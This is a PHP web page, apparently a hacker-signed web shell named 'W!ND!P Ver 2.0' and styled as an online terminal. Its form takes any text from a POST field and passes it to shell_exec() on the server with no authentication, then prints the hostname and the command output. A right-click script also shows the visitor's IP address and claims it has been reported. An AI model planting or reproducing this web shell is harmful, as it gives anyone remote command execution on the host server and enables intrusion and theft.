<!--
								Everything Written By An0n 3xPloiTeR :)
											Give a Visit :D
							https://www.google.com/search?q=An0n 3xPloiTeR
-->
<!DOCTYPE html>
<html lang="en">
	<head>
		<title>W!ND!P Ver 2.0</title>
		<meta charset="UTF-8" />
		<meta name="content" content="W!ND!P Ver 2.0" />
		<meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
		<meta name="about" content="Made By An0n 3xPloiTeR" />
		<meta name="description" content="Itx a Online Look a Like Terminal :D" />
		<meta name="revised" content="W!ND!P Ver 2.0, 01/05/2017" />
		<meta http-equiv="refresh" content="" /><!-- For refreshing page after ___ intervals of time -->
		<script language="Javascript1.2">
			function njs_nodroit() {
				alert ("W!ND!P Made By An0n 3xPloiTeR");
				alert ("There are no copyrights. You Can Share iT Freely :D");
				alert ("But Copying Someone\'s Work is a Bad Idea :\'(");
				alert ("Got Your Ip: <?php $ip = $_SERVER['REMOTE_ADDR']; echo $ip; ?> And Reported To An0n 3xPloiTeR :-)");
				return false;
			} document.oncontextmenu = njs_nodroit;
		</script>
		<style>
			body {
				background-color: black;
			}
			textarea {
				color: lawngreen;
				background-color: black; 
				font-family: Comic Sans Ms; 
				font-size: 100%;
			}
			input {
				font-family: Comic Sans Ms; 
				font-size: 50%; 
				color: white; 
				background-color: black; 
				border-width: 1px;
				border-left: black; 
				border-right: black; 
				border-width: 3px;
				border-radius: 4px; 
				border-style: groove;
				text-align: center;
			}
			footer {
				position: fixed;
				bottom: 5px;
				left: 0px;
				right: 0px;
				color: white;
				font-family: Comic Sans Ms;
				text-align: center;
			}
			.heading {
				font-family: Comic Sans Ms;
				color: red;
				text-align: center;
				font-size: 250%;
			}
			.input {
				margin-top: 3vh; 
				font-family: Comic Sans Ms;
				color: white;
				text-align: center;
				font-size: 250%;
				left: 0px;
				right: 0px;
				bottom: 0px;
			}
			.results {
				margin-top: 3vh;
				font-family: Comic Sans Ms;
				color: white;
				text-align: center;
				top: 11vh;
			}
			.footer {
				position: fixed;
				bottom: 5px;
				left: 0px;
				right: 0px;
				color: white;
				font-family: Comic Sans Ms;
				font-size: 120%;
				text-align: center;
			}
			#input.1 {
				asdasd
			}
		</style>
	</head>
	<body>
		<div class="heading">
			<font>W!ND!P Ver 2.0</font>
		</div>
		<div class="results">
			<textarea placeholder="Results Will Appeare Here :)" type="text" name="results" rows="25" cols="153"><?php
				if (isset($_POST['input'])) {
				$input = htmlspecialchars($_POST['input']);
				$host = $_SERVER['HTTP_HOST'];
				$computername = gethostname();
				$results = $computername." @ ".$host." ~ ".shell_exec($input);
				echo $results;
				} 
				else {
					echo "Type Something in Commands Here Box :D";
				}
			?>
			</textarea>
		</div>
		<div class="input">
			<form action="" method="POST">
				<input type="text" name="input" placeholder="Commands Here" size="115" />
			</form>
		</div>
		<div class="footer">
		<footer>
			<input style="font-size: 80%;" type="submit" value="Developed By An0n 3xPloiTeR">
		</footer>
		</div>
	</body>
</html>